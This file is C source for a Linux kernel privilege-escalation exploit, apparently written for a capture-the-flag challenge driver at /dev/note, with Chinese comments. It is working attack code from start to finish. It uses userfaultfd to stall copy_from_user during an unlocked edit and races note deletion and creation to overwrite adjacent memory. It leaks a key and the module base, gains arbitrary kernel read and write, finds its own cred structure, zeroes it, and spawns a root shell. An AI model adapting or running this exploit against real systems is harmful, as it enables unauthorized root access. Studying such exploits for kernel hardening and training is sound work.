// gcc -static -pthread xx.c -g -o xx
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

typedef struct _noteRequest
{
	size_t idx;
	size_t length;
	char* userptr;
}noteRequest;

int fd;
void init()
{
	fd = open("/dev/note", 0);
	if (fd<0)
		exit(-1);
	puts("[+] init done!");
}
void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

void create(char* buf, uint8_t length)
{
	noteRequest req;
	req.length  = length;
	req.userptr = buf;
	if (ioctl(fd, -256, &req) < 0)
		errExit("[-] Failed to create!");
}

void edit(uint8_t idx, char* buf, uint8_t length)
{
	noteRequest req;
	req.length  = length;
	req.userptr = buf;
	req.idx     = idx;
	if (ioctl(fd, -255, &req) < 0)
		errExit("[-] Failed to edit!");
}

void show(uint8_t idx, char* buf)
{
	noteRequest req;
	req.userptr = buf;
	req.idx     = idx;
	if (ioctl(fd, -254, &req) < 0)
		errExit("[-] Failed to show!");
}

void delete()
{
	noteRequest req;
	if (ioctl(fd, -253, &req) < 0)
		errExit("[-] Failed to delete!");
}

char buffer[0x1000];
#define FAULT_PAGE ((void*)(0x1337000))

void* handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] Handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd     = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	if (nready != 1)  // 这会一直等待，直到copy_from_user访问FAULT_PAGE
		errExit("[-] Wrong pool return value");
	printf("[+] Trigger! I'm going to hang\n");

	//现在主线程停在copy_from_user函数了，可以进行利用了
	delete();
	create(buffer, 0);
	create(buffer, 0);
	// 原始内存：note0 struct + 0x10 buffer
	// 当前内存：note0 struct + note1 struct
	// 当主线程继续拷贝时，就会破坏note1区域

	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 偶从uffd读取msg结构，虽然没用
		errExit("[-] Error in reading uffd_msg");

	struct uffdio_copy uc;
	memset(buffer, 0, sizeof(buffer));
	buffer[8] = 0xf0; //把note1 的length改成0xf0

	uc.src = (unsigned long)buffer;
	uc.dst = (unsigned long)FAULT_PAGE;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);  // 恢复执行copy_from_user

	puts("[+] done 1");
	return NULL;
}

void register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1) // create the user fault fd
		errExit("[-] ioctl-UFFDIO_API");
	if (mmap(FAULT_PAGE, 0x1000, 7, 0x22, -1, 0) != FAULT_PAGE)//create page used for user fault
		errExit("[-] mmap fault page");

	ur.range.start = (unsigned long)FAULT_PAGE;
	ur.range.len   = 0x1000;
	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("[-] ioctl-UFFDIO_REGISTER"); //注册页地址与错误处理fd，这样只要copy_from_user
	                                  //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if (s!=0)
		errExit("[-] pthread_create"); // handler函数进行访存错误处理
}

int main(int argc, char const *argv[])
{
	init();
	create(buffer, 0x10);  // memory layout: note struct + 0x10 buffer
	register_userfault();  // register the user fault
	edit(0, FAULT_PAGE, 1);
	       /* 漏洞在于edit没有实现锁，所以执行到copy_from_user时访存错误被挂起，
	       notes被其他线程篡改，copy_from_user继续运行时导致OOB 和 R&W */
	// 1.leak key
	show(1, buffer);
	unsigned long key = *(unsigned long *)buffer; 

	create(buffer, 0);   // note2: can be overwritten

	// 2. leak module base
	show(1,buffer);      
	unsigned long bss_addr = *(unsigned long*) (buffer + 0x10) ^ key;
	unsigned long module_base = bss_addr - 0x2568;
	printf("[+] key=0x%lx     module_base=0x%lx\n", key, module_base);

    // 3. leak base addr, not kernel_base
    unsigned long page_offset_base = module_base + 0x1fa;
	unsigned long* fake_note = (unsigned long*)buffer;
	fake_note[0] = 0 ^ key;
	fake_note[1] = 4 ^ key;
	fake_note[2] = page_offset_base ^ key;
	edit(1, buffer, 0x18);
	int page_offset_base_offset;
	show(2, (char*)&page_offset_base_offset);
	printf("[+] page_offset_base_offset = 0x%x\n", page_offset_base_offset);
	       //0x1f7处是指令 .text:00000000000001F7                 mov     r12, cs:page_offset_base
		   //             .text:00000000000001FE                 add     r12, [rax+10h]
	// 计算存基址的地址，并读出该地址
	page_offset_base = module_base + 0x1fe + page_offset_base_offset;
	printf("[+] module_base = 0x%lx\n", module_base);
	printf("[+] page_offset_base_offset = 0x%lx\n", page_offset_base_offset);
	printf("[+] page_offset_base = 0x%lx\n", page_offset_base);
	fake_note[1] = 8 ^ key;
	fake_note[2] = page_offset_base ^ key;
	edit(1, buffer, 0x18);
	unsigned long base_addr;
	show(2, (char *)&base_addr);
	printf("[+] base_addr = 0x%lx\n", base_addr);

    // 4. search cred   注意：都是相对base_addr找的，所以从偏移0开始找
	if (prctl(PR_SET_NAME, "try2findmesauce") < 0)
		errExit("[-] prctl set name failed");
	unsigned long* task;
	for (size_t off = 0x1ffe0000; ; off += 0x100)  // 由于length只能是1字节，所以1次只能读0xff
	{
		fake_note[0] = 0 ^ key;
		fake_note[1] = 0xfff ^ key;
		fake_note[2] = off ^ key;
		edit(1, buffer, 0x18);
		memset(buffer, 0, 0x100);
		show(2, buffer);
		task = (unsigned long*)memmem(buffer, 0x100, "try2findmesauce", 14);
		if (task != NULL)
		{
            printf("[+] off : 0x%lx\n", off);
			printf("[+] found: %p 0x%lx, 0x%lx\n", task, task[-1], task[-2]);
			if (task[-1] > 0xffff000000000000 && task[-2] > 0xffff000000000000)  // 确保cred地址在内核空间
				break;
		}
	}

    // 5. change cred to 0
	fake_note[0] = 0 ^ key;
	fake_note[1] = 0x20 ^ key;
	fake_note[2] = (task[-2] + 4 - base_addr) ^ key;  // 注意一定是修改相对base_addr的地址
	edit(1, buffer, 0x18);

	int fake_cred[8];
	memset(fake_cred, 0, sizeof(fake_cred));
	edit(2, (char*)fake_cred, 0x28);

	char* args[2] = {"/bin/sh", NULL};
	execv("/bin/sh", args);
	return 0;
}

